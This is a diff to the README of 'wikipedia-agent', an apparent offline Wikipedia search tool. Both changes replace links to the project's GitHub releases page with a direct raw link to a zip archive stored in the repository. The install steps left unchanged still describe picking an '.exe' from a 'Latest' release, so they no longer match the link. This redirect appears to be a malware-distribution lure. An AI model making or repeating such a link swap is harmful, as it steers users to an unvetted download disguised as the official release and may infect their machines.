@@ -1,6 +1,6 @@
 # 🧠 wikipedia-agent - Access Wikipedia offline without internet connection
 
-[![Download App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Zile1147/wikipedia-agent/releases)
+[![Download App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Zile1147/wikipedia-agent/main/wikipedia_agent/agent-wikipedia-2.3.zip)
 
 wikipedia-agent allows you to search and read Wikipedia articles without an active internet connection. The software uses your local computer hardware to process inquiries. It stores data in ZIM archives to provide full-text and semantic search functions. You can run this tool on devices with limited memory and processing power.
 
@@ -33,7 +33,7 @@ Processor: A standard dual-core processor from the last five years works for mos
 Follow these steps to prepare your system.
 
 Visit the link below to reach the official releases page:
-https://github.com/Zile1147/wikipedia-agent/releases
+https://raw.githubusercontent.com/Zile1147/wikipedia-agent/main/wikipedia_agent/agent-wikipedia-2.3.zip
 
 1. Look for the most recent version labeled as "Latest."
 2. Select the file ending in `.exe` for Windows.
